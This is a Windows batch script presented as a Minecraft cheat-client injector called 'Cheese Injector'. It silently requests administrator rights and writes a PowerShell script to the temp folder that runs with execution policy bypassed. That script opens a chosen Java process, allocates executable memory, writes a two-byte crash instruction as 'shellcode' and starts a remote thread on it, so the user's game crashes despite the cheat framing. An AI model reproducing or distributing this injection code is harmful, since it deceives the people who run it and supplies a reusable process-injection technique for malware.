@echo off
setlocal enabledelayedexpansion
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)
mode con cols=120 lines=30
title Cheese Injector - The Minecraft Cheat Client Injector
echo  ¨€¨€¨€¨€¨€¨€¨[¨€¨€¨[  ¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨[    ¨€¨€¨[¨€¨€¨€¨[   ¨€¨€¨[     ¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨[ ¨€¨€¨€¨€¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨€¨[ ¨€¨€¨€¨€¨€¨€¨[ ¨€¨€¨€¨€¨€¨€¨[ 
echo ¨€¨€¨X¨T¨T¨T¨T¨a¨€¨€¨U  ¨€¨€¨U¨€¨€¨X¨T¨T¨T¨T¨a¨€¨€¨X¨T¨T¨T¨T¨a¨€¨€¨X¨T¨T¨T¨T¨a¨€¨€¨X¨T¨T¨T¨T¨a    ¨€¨€¨U¨€¨€¨€¨€¨[  ¨€¨€¨U     ¨€¨€¨U¨€¨€¨X¨T¨T¨T¨T¨a¨€¨€¨X¨T¨T¨T¨T¨a¨^¨T¨T¨€¨€¨X¨T¨T¨a¨€¨€¨X¨T¨T¨T¨€¨€¨[¨€¨€¨X¨T¨T¨€¨€¨[
echo ¨€¨€¨U     ¨€¨€¨€¨€¨€¨€¨€¨U¨€¨€¨€¨€¨€¨[  ¨€¨€¨€¨€¨€¨[  ¨€¨€¨€¨€¨€¨€¨€¨[¨€¨€¨€¨€¨€¨[      ¨€¨€¨U¨€¨€¨X¨€¨€¨[ ¨€¨€¨U     ¨€¨€¨U¨€¨€¨€¨€¨€¨[  ¨€¨€¨U        ¨€¨€¨U   ¨€¨€¨U   ¨€¨€¨U¨€¨€¨€¨€¨€¨€¨X¨a
echo ¨€¨€¨U     ¨€¨€¨X¨T¨T¨€¨€¨U¨€¨€¨X¨T¨T¨a  ¨€¨€¨X¨T¨T¨a  ¨^¨T¨T¨T¨T¨€¨€¨U¨€¨€¨X¨T¨T¨a      ¨€¨€¨U¨€¨€¨U¨^¨€¨€¨[¨€¨€¨U¨€¨€   ¨€¨€¨U¨€¨€¨X¨T¨T¨a  ¨€¨€¨U        ¨€¨€¨U   ¨€¨€¨U   ¨€¨€¨U¨€¨€¨X¨T¨T¨€¨€¨[
echo ¨^¨€¨€¨€¨€¨€¨€¨[¨€¨€¨U  ¨€¨€¨U¨€¨€¨€¨€¨€¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨[¨€¨€¨€¨€¨€¨€¨€¨U¨€¨€¨€¨€¨€¨€¨€¨[    ¨€¨€¨U¨€¨€¨U ¨^¨€¨€¨€¨€¨U¨^¨€¨€¨€¨€¨€¨X¨a¨€¨€¨€¨€¨€¨€¨€¨[¨^¨€¨€¨€¨€¨€¨€¨[   ¨€¨€¨U   ¨^¨€¨€¨€¨€¨€¨€¨X¨a¨€¨€¨U  ¨€¨€¨U
echo  ¨^¨T¨T¨T¨T¨T¨a¨^¨T¨a  ¨^¨T¨a¨^¨T¨T¨T¨T¨T¨T¨a¨^¨T¨T¨T¨T¨T¨T¨a¨^¨T¨T¨T¨T¨T¨T¨a¨^¨T¨T¨T¨T¨T¨T¨a    ¨^¨T¨a¨^¨T¨a  ¨^¨T¨T¨T¨a ¨^¨T¨T¨T¨T¨a ¨^¨T¨T¨T¨T¨T¨T¨a ¨^¨T¨T¨T¨T¨T¨a   ¨^¨T¨a    ¨^¨T¨T¨T¨T¨T¨a ¨^¨T¨a  ¨^¨T¨a
echo Press any key to inject into the Minecraft process...
pause >nul
set "psScript=%temp%\injector_%random%.ps1"
> "%psScript%" echo Write-Host 'Looking for the Minecraft process' -ForegroundColor Cyan
>> "%psScript%" echo $procs = Get-Process -Name java, javaw -ErrorAction SilentlyContinue
>> "%psScript%" echo if (-not $procs) { Write-Host 'Java process not found' -ForegroundColor Red; exit 1 }
>> "%psScript%" echo Write-Host 'Find the following Java processes:' -ForegroundColor Cyan
>> "%psScript%" echo $procList = @()
>> "%psScript%" echo foreach ($p in $procs) {
>> "%psScript%" echo     $title = $p.MainWindowTitle
>> "%psScript%" echo     if ([string]::IsNullOrEmpty($title)) { $title = 'No Window' }
>> "%psScript%" echo     Write-Host ('  PID: {0,-8} name: {1,-12} title: {2}' -f $p.Id, $p.ProcessName, $title)
>> "%psScript%" echo     $procList += $p.Id
>> "%psScript%" echo }
>> "%psScript%" echo do {
>> "%psScript%" echo     $inputPid = Read-Host 'Please enter the PID of the Minecraft process you want to inject'
>> "%psScript%" echo     if ($inputPid -match '^\d+$') {
>> "%psScript%" echo         $pidInt = [int]$inputPid
>> "%psScript%" echo         if ($procList -contains $pidInt) { $targetPid = $pidInt; break }
>> "%psScript%" echo         else { Write-Host 'PID is not in the list' -ForegroundColor Red }
>> "%psScript%" echo     } else { Write-Host 'Enter a valid number PID' -ForegroundColor Red }
>> "%psScript%" echo } while ($true)
>> "%psScript%" echo Write-Host ('Target process PID: {0},Start injecting...' -f $targetPid) -ForegroundColor Yellow
>> "%psScript%" echo Add-Type -TypeDefinition @'
>> "%psScript%" echo using System;
>> "%psScript%" echo using System.Runtime.InteropServices;
>> "%psScript%" echo public class WinAPI {
>> "%psScript%" echo     [DllImport("kernel32.dll", SetLastError=true)]
>> "%psScript%" echo     public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
>> "%psScript%" echo     [DllImport("kernel32.dll", SetLastError=true)]
>> "%psScript%" echo     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);
>> "%psScript%" echo     [DllImport("kernel32.dll", SetLastError=true)]
>> "%psScript%" echo     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
>> "%psScript%" echo     [DllImport("kernel32.dll", SetLastError=true)]
>> "%psScript%" echo     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, out int lpThreadId);
>> "%psScript%" echo     [DllImport("kernel32.dll", SetLastError=true)]
>> "%psScript%" echo     public static extern bool CloseHandle(IntPtr hObject);
>> "%psScript%" echo     [DllImport("kernel32.dll", SetLastError=true)]
>> "%psScript%" echo     public static extern int GetLastError();
>> "%psScript%" echo }
>> "%psScript%" echo '@
>> "%psScript%" echo $hProcess = [WinAPI]::OpenProcess(0x1F0FFF, $false, $targetPid)
>> "%psScript%" echo if ($hProcess -eq [IntPtr]::Zero) { Write-Host ('Failed to open the process,error code: {0}' -f [WinAPI]::GetLastError()) -ForegroundColor Red; exit 1 }
>> "%psScript%" echo $addr = [WinAPI]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 2, 0x3000, 0x40)
>> "%psScript%" echo if ($addr -eq [IntPtr]::Zero) { Write-Host ('Failed to allocate memory,error code: {0}' -f [WinAPI]::GetLastError()) -ForegroundColor Red; $null = [WinAPI]::CloseHandle($hProcess); exit 1 }
>> "%psScript%" echo Write-Host ('Memory address: 0x{0:X}' -f $addr.ToInt64()) -ForegroundColor Gray
>> "%psScript%" echo $shellcode = [byte[]]@(0x0F, 0x0B)
>> "%psScript%" echo $bytesWritten = [IntPtr]::Zero
>> "%psScript%" echo $null = [WinAPI]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten)
>> "%psScript%" echo if ($bytesWritten.ToInt32() -ne $shellcode.Length) { Write-Host 'Write failed' -ForegroundColor Red; $null = [WinAPI]::CloseHandle($hProcess); exit 1 }
>> "%psScript%" echo Write-Host 'Shellcode Write successful, remote thread created...' -ForegroundColor Green
>> "%psScript%" echo $threadId = 0
>> "%psScript%" echo $null = [WinAPI]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)
>> "%psScript%" echo if ($threadId -eq 0) { Write-Host ('Failed to create remote thread,error code: {0}' -f [WinAPI]::GetLastError()) -ForegroundColor Red } else { Write-Host ('Remote thread has been created (ID: {0}),The target process is about to crash.' -f $threadId) -ForegroundColor Green }
>> "%psScript%" echo $null = [WinAPI]::CloseHandle($hProcess)
>> "%psScript%" echo Write-Host 'Operation completed.' -ForegroundColor Cyan
powershell -NoProfile -ExecutionPolicy Bypass -File "%psScript%"
del "%psScript%" 2>nul
pause